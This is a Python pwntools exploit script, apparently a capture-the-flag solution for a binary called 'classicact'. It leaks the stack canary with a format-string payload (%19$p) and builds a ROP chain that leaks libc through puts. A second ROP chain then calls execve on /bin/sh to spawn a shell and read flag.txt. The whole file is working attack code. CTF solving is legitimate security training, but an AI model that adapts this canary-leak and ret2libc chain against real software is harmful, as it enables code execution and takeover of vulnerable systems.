#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('classicact')
libc = ELF('libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *vuln+110
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil(b"Please enter your name!");

#This is where the canary lives on the stack
io.sendline(b"%19$p")

#Lets parse the canary for our payload
io.recvline()
io.recvline()
line = io.recvline()
line = line[:-1]
print(line)
canary = int(line, 16)
print(hex(canary))

#Construct a ROP to leak libc
rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.call(exe.symbols['main'])

stage1 = b"A"*(64+8) + p64(canary) + b"B"*8 + rop.chain()
log.info("Stage 1: %s" % stage1)
log.info("Rop1 chain dump:\n%s" % rop.dump())
io.recvuntil(b"What would you like to do today?")

print(io.clean())
io.sendline(stage1)

#recv up to the leaked puts address in Libc
io.recvline()
recieved = io.recvline()

log.info("Recieved: ")
print(recieved)

recieved = recieved.strip()
leak = u64(recieved.ljust(8, b"\x00"))
print("reached")
log.info("Leaked libc address, puts:" + hex(leak))

#libc base address
if libc != "":
    libc.address = leak - libc.symbols["puts"]
    log.info("Libc base address @ %s" % hex(libc.address))


#construct rop chain
rop2 = ROP([exe, libc])
binsh = next(libc.search(b"/bin/sh"))
rop2.execve(binsh, 0, 0)

# system = rop2.system(binsh)
#exit = rop2.exit()

log.info("rop2 Chain dump:\n%s" % rop2.dump())

# construct payloads
junk_line = b"blahblah"
stage2=b"A"*72 + p64(canary) + b"B"*8 + rop2.chain()

#send payloads
io.recvuntil(b"Please enter your name!")
io.sendline(junk_line)
io.recvuntil(b"What would you like to do today?")
io.sendline(stage2)

log.info("Stage 2: %s" % stage2)

#Money
io.sendline("cat flag.txt")
io.recvline()
io.recvline()
line = io.recvline()
print(line)
assert b"UMDCTF" in line

